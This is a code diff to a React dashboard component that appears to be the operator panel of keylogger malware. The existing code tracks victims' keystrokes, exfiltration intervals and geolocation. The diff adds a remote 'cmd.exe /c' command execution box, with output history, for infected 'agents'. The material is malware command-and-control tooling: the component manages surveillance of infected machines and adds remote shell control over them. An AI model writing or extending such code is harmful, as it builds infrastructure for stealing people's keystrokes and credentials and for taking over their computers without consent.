@@ -1,6 +1,6 @@
 import { useState, useCallback, useRef, useEffect } from "react";
 import { AreaChart, Area, XAxis, YAxis, Tooltip, ResponsiveContainer } from "recharts";
-import type { Agent, KeystrokeEntry, AgentConfig } from "../types";
+import type { Agent, KeystrokeEntry, AgentConfig, CommandResult } from "../types";
 import { api } from "../services/api";
 import { getGeo } from "../services/geo";
 
@@ -8,13 +8,15 @@ interface AgentDetailPanelProps {
   agent: Agent;
   entries: KeystrokeEntry[];
   activityData: { hour: string; keystrokes: number }[];
+  commandResults: CommandResult[];
   onDelete?: (id: string) => void;
+  onSendCommand?: (cmd: string) => void;
   latestVersion?: string | null;
 }
 
 const TAG_COLORS = ["#58a6ff", "#3fb950", "#d29922", "#a855f7", "#22d3ee"];
 
-export function AgentDetailPanel({ agent, entries, activityData, onDelete, latestVersion }: AgentDetailPanelProps) {
+export function AgentDetailPanel({ agent, entries, activityData, commandResults, onDelete, onSendCommand, latestVersion }: AgentDetailPanelProps) {
   const [exfilInterval, setExfilInterval] = useState(30);
   const [blacklistTags, setBlacklistTags] = useState<string[]>(["passwords", "banking"]);
   const [tagInput, setTagInput] = useState("");
@@ -22,6 +24,8 @@ export function AgentDetailPanel({ agent, entries, activityData, onDelete, lates
   const [syncState, setSyncState] = useState<"idle" | "syncing" | "synced" | "error">("idle");
   const [geo, setGeo] = useState<{ country: string; countryCode: string; city: string } | null>(null);
   const [geoDone, setGeoDone] = useState(false);
+  const [commandInput, setCommandInput] = useState("");
+  const [commandHistoryOpen, setCommandHistoryOpen] = useState(true);
 
   useEffect(() => {
     setGeo(null);
@@ -375,6 +379,130 @@ export function AgentDetailPanel({ agent, entries, activityData, onDelete, lates
                 </button>
               )}
             </div>
+          </div>
+
+          {/* Command Execution */}
+          <div
+            className="rounded p-4"
+            style={{ backgroundColor: "#161b22", border: "1px solid #30363d" }}
+          >
+            <div
+              className="mb-3"
+              style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 10, letterSpacing: "0.1em" }}
+            >
+              COMMAND EXECUTION
+            </div>
+            <div className="flex gap-2 mb-2">
+              <input
+                type="text"
+                placeholder="cmd.exe /c ..."
+                value={commandInput}
+                onChange={(e) => setCommandInput(e.target.value)}
+                onKeyDown={(e) => {
+                  if (e.key === "Enter" && commandInput.trim() && onSendCommand) {
+                    onSendCommand(commandInput.trim());
+                    setCommandInput("");
+                    setCommandHistoryOpen(true);
+                  }
+                }}
+                className="flex-1 bg-[#21262d] rounded px-2 py-1.5 outline-none placeholder-[#30363d]"
+                style={{
+                  border: "1px solid #30363d",
+                  color: "#e6edf3",
+                  fontFamily: "JetBrains Mono, monospace",
+                  fontSize: 11,
+                }}
+              />
+              <button
+                onClick={() => {
+                  if (commandInput.trim() && onSendCommand) {
+                    onSendCommand(commandInput.trim());
+                    setCommandInput("");
+                    setCommandHistoryOpen(true);
+                  }
+                }}
+                disabled={!commandInput.trim() || !onSendCommand}
+                className="px-2.5 py-1.5 rounded transition-colors disabled:opacity-40"
+                style={{
+                  backgroundColor: commandInput.trim() && onSendCommand ? "#238636" : "#21262d",
+                  border: "1px solid #30363d",
+                  color: "#e6edf3",
+                  fontFamily: "JetBrains Mono, monospace",
+                  fontSize: 10,
+                  cursor: commandInput.trim() && onSendCommand ? "pointer" : "not-allowed",
+                }}
+              >
+                RUN
+              </button>
+            </div>
+
+            {commandResults.length > 0 && (
+              <div>
+                <button
+                  onClick={() => setCommandHistoryOpen(!commandHistoryOpen)}
+                  className="w-full flex items-center justify-between py-1.5 px-2 rounded transition-colors hover:bg-[#21262d]"
+                  style={{
+                    color: "#8b949e",
+                    fontFamily: "JetBrains Mono, monospace",
+                    fontSize: 10,
+                  }}
+                >
+                  <span>HISTORY ({commandResults.length})</span>
+                  <span>{commandHistoryOpen ? "▲" : "▼"}</span>
+                </button>
+
+                {commandHistoryOpen && (
+                  <div
+                    className="mt-1 max-h-64 overflow-y-auto space-y-2"
+                    style={{ scrollbarWidth: "thin", scrollbarColor: "#30363d #161b22" }}
+                  >
+                    {commandResults.slice(0, 20).map((result) => (
+                      <div
+                        key={result.id}
+                        className="rounded p-2"
+                        style={{
+                          backgroundColor: "#0d1117",
+                          border: "1px solid #30363d",
+                        }}
+                      >
+                        <div
+                          className="flex items-center justify-between mb-1"
+                          style={{ color: "#8b949e", fontFamily: "JetBrains Mono, monospace", fontSize: 9 }}
+                        >
+                          <span className="truncate flex-1">{result.command}</span>
+                          <span
+                            className="ml-2 flex-shrink-0 px-1 rounded"
+                            style={{
+                              backgroundColor: result.exitCode === 0 ? "#3fb9501a" : "#f8514933",
+                              color: result.exitCode === 0 ? "#3fb950" : "#f85149",
+                            }}
+                          >
+                            {result.exitCode === 0 ? "OK" : `EXIT ${result.exitCode}`}
+                          </span>
+                        </div>
+                        {result.stdout && (
+                          <pre
+                            className="mt-1 p-1.5 rounded overflow-x-auto text-xs leading-relaxed"
+                            style={{
+                              backgroundColor: "#161b22",
+                              color: "#e6edf3",
+                              fontFamily: "JetBrains Mono, monospace",
+                              fontSize: 9,
+                              maxHeight: 120,
+                              overflowY: "auto",
+                              whiteSpace: "pre-wrap",
+                              wordBreak: "break-all",
+                            }}
+                          >
+                            {result.stdout}
+                          </pre>
+                        )}
+                      </div>
+                    ))}
+                  </div>
+                )}
+              </div>
+            )}
           </div>
         </div>
 
